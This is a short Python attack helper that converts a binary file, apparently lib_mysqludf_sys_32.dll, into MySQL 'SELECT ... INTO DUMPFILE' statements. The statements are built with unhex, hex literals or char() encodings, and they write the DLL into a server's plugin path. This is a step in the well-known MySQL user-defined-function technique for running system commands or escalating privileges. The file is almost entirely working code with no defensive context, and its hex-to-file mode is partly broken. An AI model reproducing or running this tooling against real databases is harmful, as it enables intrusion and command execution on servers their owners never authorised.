# -*- coding:utf-8 -*-
import binascii
import os, sys
import struct

def filetounhex(filename,outfile):
    if os.path.isfile(filename):
        with open(filename, 'rb') as f:
            content = f.read()
        print("select unhex(BINARY \"{}\") into dumpfile \"{}\";".format(str(binascii.hexlify(content).decode("gb2312")),outfile))
    else:
        print(filename + " not found.")


def filetohex(filename,outfile):
    if os.path.isfile(filename):
        with open(filename, 'rb') as f:
            content = f.read()
        print("select 0x{} into dumpfile \"{}\";".format(str(binascii.hexlify(content).decode("gb2312")),outfile))
    else:
        print(filename + " not found.")

# MySQL Char(x,x,x)
# select char(77, 90, ) into dumpfile 'C:/123456.txt'
def filetochar(filename,outfile):
    lists =[]
    x = ""
    f = open(filename, 'rb')
    cont = f.read(1)
    while len(cont) > 0:
        data = struct.unpack("B", cont)
        lists.append(str(data[0]))
        x += str(data[0]) + ","
        cont = f.read(1)
    f.close()
    # print(lists)
    print("select char("+x[:-1]+") into dumpfile '{}';".format(outfile))

def hextofile(hex_file,outfile):
    if os.path.isfile(hex_file):
        with open(hex_file, 'rb') as f:
            content = f.read()
        hex_str = binascii.unhexlify(content.encode('gb2312')).decode('gb2312')
        print(hex_str)
    else:
        print(hex_file + " not found.")

if __name__ == "__main__":
    if len(sys.argv) == 4:
        index = sys.argv[1]
        file = sys.argv[2]
        outfile = sys.argv[3]
        if index == "1":
            filetounhex(file,outfile)
        elif index == "2":
            filetohex(file,outfile)
        elif index == "3":
            filetochar(file,outfile)
        elif index == "4":
            hextofile(file,outfile)
    else:
        print(sys.argv[0]+" 1 lib_mysqludf_sys_32.dll libpath")  # select unhex(BINARY
        print(sys.argv[0]+" 2 lib_mysqludf_sys_32.dll libpath")  # select 0xaa00
        print(sys.argv[0]+" 3 lib_mysqludf_sys_32.dll libpath")  # select char(7
        print(sys.argv[0]+" 4 lib_mysqludf_sys_32.dll libpath")  # 11234ABCDEF -> DLL

